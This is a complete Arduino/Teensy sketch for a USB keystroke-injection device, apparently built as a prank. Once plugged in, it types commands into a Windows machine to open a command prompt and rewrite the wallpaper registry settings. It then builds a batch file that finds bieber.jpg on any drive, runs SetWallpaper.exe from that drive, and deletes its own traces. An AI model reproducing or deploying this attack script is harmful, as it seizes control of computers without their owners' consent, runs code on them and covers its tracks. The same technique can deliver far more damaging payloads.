void setup() {
  pinMode(11, OUTPUT);    

  delay(27000);
  digitalWrite(11, HIGH);
  delay(3000);
  digitalWrite(11, LOW);

  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_D);
  Keyboard.send_now();

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  delay(500);

  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(500);

  Keyboard.println("cmd");
  delay(500);

  Keyboard.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallpaperStyle /t REG_SZ /d 0 /f");
  Keyboard.println("reg add \"HKCU\\Control Panel\\Desktop\" /v TileWallpaper /t REG_SZ /d 1 /f");
  delay(500);

  Keyboard.println("cd %TEMP%");
  Keyboard.println("copy /Y CON bieber.bat");
  delay(500);
  Keyboard.println("@echo off & setLocal EnableDelayedExpansion");
  Keyboard.println("for %%d in (c d e f g h i j k l m n o p q r s t u v w x y z) do ( if exist %%d: ( for /f \"tokens=* delims= \" %%a  in ('dir/b %%d:\\bieber.jpg 2^>nul') do ( copy %%d:\\bieber.jpg %TEMP%\\bieber.jpg & %%d:\\SetWallpaper.exe )  ) )");
  delay(500);

  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.set_key1(KEY_Z);
  Keyboard.send_now();

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);

  Keyboard.println();

  Keyboard.println("bieber.bat");

  Keyboard.println("del bieber.jpg bieber.bat");
  Keyboard.println("exit");

  delay(5000);

  Disk.claim();
}

void loop() {
}